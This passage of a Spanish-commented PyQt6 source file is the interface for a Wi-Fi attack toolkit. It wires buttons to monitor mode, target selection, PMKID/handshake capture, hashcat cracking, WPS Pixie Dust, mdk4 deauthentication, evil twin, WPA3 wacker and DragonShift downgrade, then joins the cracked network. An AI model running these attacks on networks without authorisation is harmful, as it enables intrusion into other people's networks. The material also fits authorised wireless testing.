        cmd = self._comando_instalacion(esenciales or faltan)
        if not cmd:
            self._log("ℹ No falta ningún paquete conocido.")
            return
        from PyQt6.QtWidgets import QApplication
        QApplication.clipboard().setText(cmd)
        self._log("📋 Copiado: %s" % cmd)

    # =====================================================================
    # INTERFACES Y MONITOR (RF3)
    # =====================================================================
    def _refrescar_ifaces(self) -> None:
        if wof is None:
            return
        self._lanzar("ifaces", self._tarea_ifaces)

    def _tarea_ifaces(self) -> None:
        try:
            ifaces = list(wof.interfaces() or [])
        except Exception as exc:
            self._log("⚠ interfaces(): %s" % exc)
            ifaces = []
        monitores = []
        try:
            monitores = list(wof.listar_monitores() or [])
        except Exception:
            monitores = []
        self._sig_ifaces.emit(ifaces + [("MON::" + m) for m in monitores])

    def _on_ifaces(self, lista: list) -> None:
        prev = self.cmb_iface.currentText()
        self.cmb_iface.blockSignals(True)
        self.cmb_iface.clear()
        for it in lista:
            if isinstance(it, str) and it.startswith("MON::"):
                self.cmb_iface.addItem("🛰 " + it[5:], it[5:])
            else:
                self.cmb_iface.addItem(str(it), str(it))
        self.cmb_iface.blockSignals(False)
        if prev:
            idx = self.cmb_iface.findText(prev)
            if idx >= 0:
                self.cmb_iface.setCurrentIndex(idx)
        self._on_iface_cambiada(self.cmb_iface.currentText())
        self._refrescar_botones()
        self._log("📶 Interfaces detectadas: %d" % self.cmb_iface.count())

    def _on_iface_cambiada(self, _txt: str) -> None:
        self._iface_actual = self.cmb_iface.currentData() or ""
        self._mon_actual = None
        self._modo_solo_escucha = False
        self._refrescar_botones()

    def _op_monitor_on(self) -> None:
        iface = self._iface_actual
        if not iface:
            self._log("⚠ Selecciona una interfaz primero.")
            return

        def tarea():
            # Idempotencia (caso límite 14): si ya está en monitor, no repetir.
            try:
                if wof.es_monitor(iface):
                    self._sig_resultado.emit("monitor",
                                             "Ya estaba en monitor: %s" % iface)
                    self._mon_actual = iface
                    return
            except Exception:
                pass
            # Aviso de capacidades: si no soporta monitor, degradar.
            mon = None
            try:
                mon = wof.monitor_on(iface)
            except Exception as exc:
                self._sig_log.emit("⚠ monitor_on(): %s" % exc)
            if mon:
                self._mon_actual = mon
                self._sig_resultado.emit("monitor", "Monitor activo: %s" % mon)
            else:
                self._modo_solo_escucha = True
                self._sig_resultado.emit(
                    "monitor_fail",
                    "El adaptador no soporta monitor/inyección: se usará "
                    "solo-escucha sobre %s." % iface)

        self._lanzar("monitor", tarea)

    def _op_monitor_off(self) -> None:
        mon = self._mon_actual
        iface = self._iface_actual

        def tarea():
            try:
                msg = wof.monitor_off(mon, iface)
                if msg:
                    self._sig_log.emit(str(msg))
            except Exception as exc:
                self._sig_log.emit("⚠ monitor_off(): %s" % exc)
            try:
                wof.restaurar_red(iface)
            except Exception as exc:
                self._sig_log.emit("⚠ restaurar_red(): %s" % exc)
            self._mon_actual = None
            self._modo_solo_escucha = False
            self._sig_resultado.emit("monitor", "Red restaurada en %s" % iface)

        self._lanzar("monitor", tarea)

    # =====================================================================
    # ESCANEO (RF4)
    # =====================================================================
    def _op_escanear(self) -> None:
        if wof is None:
            return
        iface = self._mon_actual or self._iface_actual
        if not iface:
            self._log("⚠ Selecciona una interfaz.")
            return
        segundos = int(self.sp_segundos.value())
        banda = self.cmb_banda.currentData()
        solo_escucha = self._modo_solo_escucha or not self._mon_actual

        def tarea():
            self._sig_log.emit(
                "🔎 Escaneando %s durante %ds%s…"
                % (iface, segundos,
                   " (solo-escucha)" if solo_escucha else ""))
            try:
                aps = wof.escanear(iface, segundos=segundos, banda=banda)
            except Exception as exc:
                self._sig_log.emit("✖ escanear(): %s" % exc)
                aps = []
            aps = [a for a in (aps or []) if isinstance(a, dict)]
            self._sig_aps.emit(aps)
            self._sig_log.emit("🔎 %d APs encontrados." % len(aps))

        self._lanzar("escanear", tarea)

    def _on_aps(self, aps: list) -> None:
        """Rellena la tabla. Ordenar se desactiva durante el volcado."""
        self.tabla.setSortingEnabled(False)
        self.tabla.setRowCount(0)
        self._aps = []
        for idx, ap in enumerate(aps):
            seg = str(ap.get("seguridad") or "desconocida")
            fila = self.tabla.rowCount()
            self.tabla.insertRow(fila)

            it0 = self._item(str(ap.get("essid") or "<oculto>"),
                             color=C_TEXTO, negrita=True, dato=idx)
            if ap.get("recomendado"):
                it0.setText("★ " + it0.text())
                it0.setToolTip("AP recomendado por el backend.")
            self.tabla.setItem(fila, 0, it0)

            self.tabla.setItem(fila, 1, self._item(
                str(ap.get("bssid") or "—"), color=C_GRIS))
            self.tabla.setItem(fila, 2, self._num(ap.get("canal")))
            self.tabla.setItem(fila, 3, self._num(ap.get("senal")))

            itseg = self._item(seg, color=_COLOR_SEGURIDAD.get(seg, C_TEXTO),
                               negrita=True)
            itseg.setToolTip("cifrado=%s auth=%s wpa3=%s wpa2=%s wep=%s "
                             "abierta=%s transicion=%s"
                             % (ap.get("cifrado"), ap.get("auth"),
                                ap.get("wpa3"), ap.get("wpa2"), ap.get("wep"),
                                ap.get("abierta"), ap.get("transicion")))
            self.tabla.setItem(fila, 4, itseg)

            wps = ap.get("wps")
            self.tabla.setItem(fila, 5, self._item(
                "Sí" if wps else "No",
                color=C_VERDE if wps else C_GRIS))
            self.tabla.setItem(fila, 6, self._item(
                str(ap.get("banda") or "—"), color=C_GRIS))
            self.tabla.setItem(fila, 7, self._item(
                "★" if ap.get("recomendado") else "",
                color=C_AMBAR))

            self._aps.append(ap)

        self.tabla.setSortingEnabled(True)
        self._refrescar_botones()

    def _item(self, texto, color=None, negrita=False, dato=None, tip=None):
        it = QTableWidgetItem(str(texto))
        it.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
        if color:
            it.setForeground(QBrush(QColor(color)))
        if negrita:
            f = it.font()
            f.setBold(True)
            it.setFont(f)
        if dato is not None:
            it.setData(Qt.ItemDataRole.UserRole, dato)
        if tip:
            it.setToolTip(tip)
        return it

    def _num(self, valor):
        """Celda numérica: ordena como número, no como texto."""
        try:
            n = int(valor)
        except (TypeError, ValueError):
            it = QTableWidgetItem("—")
            it.setForeground(QBrush(QColor(C_GRIS)))
            it.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
            return it
        it = QTableWidgetItem()
        it.setData(Qt.ItemDataRole.DisplayRole, n)
        it.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
        return it

    def _ap_de_fila(self, fila: int):
        """Recupera el dict del AP usando el índice guardado en UserRole.
        Inmune al reordenado de la tabla."""
        it = self.tabla.item(fila, 0)
        if it is None:
            return None
        idx = it.data(Qt.ItemDataRole.UserRole)
        try:
            return self._aps[int(idx)]
        except (TypeError, ValueError, IndexError):
            return None

    def _marcar_objetivo(self) -> None:
        fila = self.tabla.currentRow()
        ap = self._ap_de_fila(fila)
        if not ap:
            self._log("⚠ Selecciona una fila de la tabla.")
            return
        self._objetivo = ap
        self.lbl_objetivo.setText(
            "Objetivo: <b>%s</b> · %s · canal %s · %s"
            % (ap.get("essid") or "<oculto>", ap.get("bssid"),
               ap.get("canal"), ap.get("seguridad")))
        self.txt_ssid.setText(str(ap.get("essid") or ""))
        self._log("🎯 Objetivo marcado: %s (%s) %s"
                  % (ap.get("essid"), ap.get("bssid"), ap.get("seguridad")))
        self._refrescar_botones()

    # =====================================================================
    # ATAQUE AUTOMÁTICO (RF5)
    # =====================================================================
    def _op_atacar(self) -> None:
        if wof is None or not self._objetivo:
            self._log("⚠ Marca un objetivo primero.")
            return
        wl = self._wordlist_actual()
        if not wl:
            self._log("⚠ No hay diccionario seleccionado.")
            return
        mon = self._mon_actual or self._iface_actual
        iface = self._iface_actual
        ap = dict(self._objetivo)
        segundos_pmkid = int(self.sp_pmkid.value())

        def tarea():
            self._sig_log.emit("⚔ Iniciando cadena automática sobre %s (%s)"
                               % (ap.get("essid"), ap.get("bssid")))
            if str(ap.get("seguridad")) == "WPA3-SAE":
                self._sig_log.emit(
                    "ℹ WPA3-SAE puro: sin PMKID ni handshake clásico.")
            elif ap.get("transicion"):
                self._sig_log.emit(
                    "ℹ Modo transición WPA2/WPA3: se trata como WPA2.")
            psk, informe = wof.auto_atacar(
                mon, iface, ap, wl, log=self._log_cb,
                segundos_pmkid=segundos_pmkid)
            if informe:
                self._sig_log.emit("─── Informe de la cadena ───\n%s" % informe)
            if psk:
                self._sig_resultado.emit("psk", str(psk))
            else:
                self._sig_resultado.emit(
                    "sinpsk", "La cadena no obtuvo PSK. Revisa el log, "
                    "prueba otro diccionario o usa el ataque WPS.")

        self._lanzar("atacar", tarea)

    # =====================================================================
    # CRACKEO MANUAL DE CAPTURA (RF6)
    # =====================================================================
    def _op_crackear_captura(self) -> None:
        ruta, _ = QFileDialog.getOpenFileName(
            self, "Selecciona captura o hash", "",
            "Capturas (*.pcapng *.pcap *.cap *.22000 *.hccapx);;Todos (*)")
        if not ruta:
            return
        wl = self._wordlist_actual()
        if not wl:
            self._log("⚠ Selecciona un diccionario antes de crackear.")
            return
        reglas = self.cmb_reglas.currentData() or None

        def tarea():
            self._sig_log.emit("🔓 Preparando crackeo de %s" % ruta)
            hashfile = ruta
            if not ruta.endswith(".22000"):
                hashfile, msg = wof.convertir(ruta)
                if msg:
                    self._sig_log.emit(str(msg))
                if not hashfile:
                    raise RuntimeError("hcxpcapngtool no produjo hash válido.")
            self._sig_log.emit("🔓 hashcat -m 22000 sobre %s" % hashfile)
            psk, metodo = wof.crackear(
                hashfile, wl, log=self._log_cb, reglas=reglas)
            if psk:
                self._sig_log.emit("✔ Crackeado con %s" % (metodo or "?"))
                self._sig_resultado.emit("psk", str(psk))
            else:
                self._sig_resultado.emit(
                    "sinpsk", "Sin PSK (método: %s). Prueba otra wordlist."
                    % (metodo or "?"))

        self._lanzar("crackear", tarea)

    # =====================================================================
    # CONEXIÓN A LA RED (RF7)
    # =====================================================================
    def _op_conectar(self) -> None:
        if wof is None:
            return
        iface = self._iface_actual
        ssid = self.txt_ssid.text().strip()
        psk = self.txt_psk.text().strip() or self._psk
        if not iface or not ssid:
            self._log("⚠ Hacen falta interfaz y SSID.")
            return
        if not psk:
            psk, ok = QInputDialog.getText(
                self, "PSK", "Contraseña para '%s':" % ssid)
            psk = psk.strip()
            if not ok or not psk:
                return

        def tarea():
            self._sig_log.emit("🔌 Conectando a '%s' por %s…" % (ssid, iface))
            try:
                msg = wof.conectar(iface, ssid, psk)
                if msg:
                    self._sig_log.emit(str(msg))
            except Exception as exc:
                self._sig_log.emit("✖ conectar(): %s" % exc)
            ip = ""
            try:
                ip = wof.ip_de(iface) or ""
            except Exception:
                ip = ""
            if ip:
                self._sig_resultado.emit(
                    "ip", "Conectado a '%s'. IP: %s" % (ssid, ip))
                self._sig_log.emit("✅ IP obtenida en %s: %s" % (iface, ip))
            else:
                self._sig_log.emit(
                    "⚠ Sin IP tras DHCP: restaurando estado anterior.")
                try:
                    wof.restaurar_red(iface)
                except Exception:
                    pass
                self._sig_resultado.emit(
                    "ip", "No se obtuvo IP en '%s' (revisa PSK o DHCP)."
                    % iface)

        self._lanzar("conectar", tarea)

    # =====================================================================
    # PUENTE AL ESCÁNER (RF8)
    # =====================================================================
    def enviar_subred(self) -> None:
        """Calcula la subred de la interfaz y la publica por señal."""
        iface = self._iface_actual
        if not iface:
            self._log("⚠ Selecciona una interfaz.")
            return

        def tarea():
            sub = ""
            try:
                sub = wof.subred_de(iface) if wof else ""
            except Exception as exc:
                self._sig_log.emit("⚠ subred_de(): %s" % exc)
            if not sub and _escaner is not None:
                try:
                    sub = _escaner.detectar_subred() or ""
                except Exception as exc:
                    self._sig_log.emit("⚠ detectar_subred(): %s" % exc)
            if sub:
                self._sig_resultado.emit("subred", sub)
            else:
                self._sig_resultado.emit("subred_fail", "")

        self._lanzar("subred", tarea)

    # =====================================================================
    # AVANZADO: WPS, deauth, evil twin, SAE
    # =====================================================================
    def _requiere_objetivo(self) -> bool:
        if not self._objetivo:
            self._log("⚠ Marca un objetivo primero (doble clic en la fila).")
            return False
        return True

    def _op_wps_escanear(self) -> None:
        if wof is None or not self._mon_actual:
            self._log("⚠ Necesita modo monitor activo.")
            return
        mon = self._mon_actual
        segundos = int(self.sp_segundos.value())

        def tarea():
            self._sig_log.emit("🔑 wash: escaneando APs con WPS…")
            res = []
            try:
                res = wof.wps_escanear(mon, segundos=max(8, segundos // 2)) or []
            except Exception as exc:
                self._sig_log.emit("✖ wps_escanear(): %s" % exc)
            self._sig_wps.emit([r for r in res if isinstance(r, dict)])

        self._lanzar("wps", tarea)

    def _on_wps(self, res: list) -> None:
        if not res:
            self._log("🔑 Ningún AP con WPS visible.")
            return
        self._log("🔑 %d APs con WPS:" % len(res))
        for r in res:
            self._log("   %s  %s  canal=%s  wps=%s  lock=%s"
                      % (r.get("essid"), r.get("bssid"), r.get("canal"),
                         r.get("wps"), r.get("lock")))

    def _op_wps_atacar(self) -> None:
        if wof is None or not self._requiere_objetivo():
            return
        if not self._mon_actual:
            self._log("⚠ Necesita modo monitor activo.")
            return
        mon, ap = self._mon_actual, dict(self._objetivo)

        def tarea():
            tecnica = "pixie"
            try:
                cmd = wof.wps_comando(tecnica, mon, ap.get("bssid"),
                                      ap.get("canal"))
            except Exception as exc:
                raise RuntimeError("wps_comando(): %s" % exc)
            self._sig_log.emit("✨ Pixie dust: %s" % cmd)
            psk = None
            try:
                psk = wof.correr_wps(cmd, log=self._log_cb, timeout=600)
            except Exception as exc:
                self._sig_log.emit("⚠ correr_wps(): %s" % exc)
            if psk:
                self._sig_resultado.emit("psk", str(psk))
            else:
                self._sig_resultado.emit(
                    "sinpsk", "Pixie dust sin resultado; prueba PIN completo.")

        self._lanzar("wps", tarea)

    def _op_deauth(self) -> None:
        if wof is None or not self._requiere_objetivo():
            return
        if not self._mon_actual:
            self._log("⚠ Necesita modo monitor activo.")
            return
        mon, ap = self._mon_actual, dict(self._objetivo)

        def tarea():
            self._sig_log.emit("📣 mdk4 deauth contra %s" % ap.get("bssid"))
            try:
                wof.mdk4(mon, modo="a", segundos=60, log=self._log_cb)
            except Exception as exc:
                self._sig_log.emit("⚠ mdk4(): %s" % exc)

        self._lanzar("deauth", tarea)

    def _op_evil_twin(self) -> None:
        if wof is None or not self._requiere_objetivo():
            return
        iface, ap = self._iface_actual, dict(self._objetivo)

        def tarea():
            self._sig_log.emit("👥 Evil twin para '%s'" % ap.get("essid"))
            try:
                out = wof.evil_twin(iface, ap.get("essid"), ap.get("canal"),
                                    segundos=120, log=self._log_cb)
                if out:
                    self._sig_log.emit("👥 hostapd: %s" % out)
            except Exception as exc:
                self._sig_log.emit("⚠ evil_twin(): %s" % exc)

        self._lanzar("eviltwin", tarea)

    def _op_wacker(self) -> None:
        if wof is None or not self._requiere_objetivo():
            return
        wl = self._wordlist_actual()
        if not wl:
            self._log("⚠ Selecciona un diccionario.")
            return
        ap = dict(self._objetivo)
        iface = self._iface_actual

        def tarea():
            self._sig_log.emit("🅦 wacker contra %s" % ap.get("essid"))
            try:
                wof.wpa3_wacker(iface, ap.get("essid"), ap.get("bssid"), wl,
                                log=self._log_cb)
            except Exception as exc:
                self._sig_log.emit("⚠ wpa3_wacker(): %s" % exc)

        self._lanzar("wacker", tarea)

    def _op_dragonshift(self) -> None:
        if wof is None:
            return

        def tarea():
            self._sig_log.emit("🐉 DragonShift (downgrade transition-mode)")
            try:
                wof.dragonshift(log=self._log_cb)
            except Exception as exc:
                self._sig_log.emit("⚠ dragonshift(): %s" % exc)

        self._lanzar("dragonshift", tarea)

    # =====================================================================
    # WORDSLISTS
    # =====================================================================
    def _tarea_words(self) -> None:
        words = []
        try:
            words = list(wof.diccionarios() or [])
        except Exception as exc:
            self._sig_log.emit("⚠ diccionarios(): %s" % exc)
        self._sig_words.emit(words)

    def _on_words(self, words: list) -> None:
        prev = self.cmb_wordlist.currentText()
        self.cmb_wordlist.clear()
        for w in words:
            self.cmb_wordlist.addItem(os.path.basename(w), w)
        if not words:
            self.cmb_wordlist.addItem("(sin diccionarios)", "")
        if prev:
            idx = self.cmb_wordlist.findText(prev)
            if idx >= 0:
                self.cmb_wordlist.setCurrentIndex(idx)

    def _elegir_wordlist(self) -> None:
        ruta, _ = QFileDialog.getOpenFileName(
            self, "Selecciona diccionario", "", "Diccionarios (*.txt *.lst "
            "*.dic *.rule);;Todos (*)")
        if not ruta:
            return
        idx = self.cmb_wordlist.findData(ruta)
        if idx < 0:
            self.cmb_wordlist.addItem("📁 " + os.path.basename(ruta), ruta)
            idx = self.cmb_wordlist.count() - 1
        self.cmb_wordlist.setCurrentIndex(idx)
        self._log("📁 Diccionario: %s" % ruta)

    def _wordlist_actual(self) -> str:
        return self.cmb_wordlist.currentData() or ""

    # =====================================================================
    # ESTADO DE BOTONES
    # =====================================================================
    def _refrescar_botones(self) -> None:
        o = self._ocupado
        hay_iface = bool(self._iface_actual)
        hay_obj = self._objetivo is not None
        hay_mon = bool(self._mon_actual)
        hay_fila = self.tabla.currentRow() >= 0

        for b, cond in (
            (self.btn_escanear, not o and hay_iface),
            (self.btn_monitor_on, not o and hay_iface),
            (self.btn_monitor_off, not o and (hay_iface or hay_mon)),
            (self.btn_refrescar_if, not o),
            (self.btn_rediagnostico, not o),
            (self.btn_objetivo, not o and hay_fila),
            (self.btn_atacar, not o and hay_obj and hay_iface),
            (self.btn_crack_captura, not o),
            (self.btn_conectar, not o and hay_iface),
            (self.btn_subred, not o and hay_iface),
            (self.btn_wps_scan, not o and hay_mon),
            (self.btn_wps_atk, not o and hay_obj and hay_mon),
            (self.btn_deauth, not o and hay_obj and hay_mon),
            (self.btn_evil, not o and hay_obj and hay_iface),
            (self.btn_wacker, not o and hay_obj and hay_iface),
            (self.btn_dragonshift, not o),
        ):
            b.setEnabled(bool(cond))
        self.btn_cancelar.setEnabled(o)

        # Tooltips explicativos cuando están deshabilitados.
        if not hay_mon:
            self.btn_wps_scan.setToolTip("Requiere modo monitor activo.")
            self.btn_wps_atk.setToolTip("Requiere monitor + objetivo.")
            self.btn_deauth.setToolTip("Requiere monitor + objetivo.")
        if not hay_obj:
            self.btn_atacar.setToolTip("Marca un AP objetivo primero.")
            self.btn_wacker.setToolTip("Marca un AP objetivo primero.")

    # =====================================================================
    # API PÚBLICA PARA MainWindow
    # =====================================================================
    @property
    def lanzar_al_enviar(self) -> bool:
        """True si el operador quiere que el Escáner arranque al recibir la
        subred (RF8)."""
        return bool(self.chk_lanzar.isChecked())

    @property
    def ultima_subred(self) -> str:
        return getattr(self, "_ultima_subred", "")

    def objetivo_actual(self):
        """Copia del AP objetivo (o None)."""
        return dict(self._objetivo) if self._objetivo else None

    def psk_actual(self) -> str:
        return self._psk

    # =====================================================================
    # CIERRE
    # =====================================================================
    def closeEvent(self, evento):  # pragma: no cover - depende del contenedor
        """Si algún día se usa como diálogo, limpia igual que `detener()`."""
        self.detener()
        super().closeEvent(evento)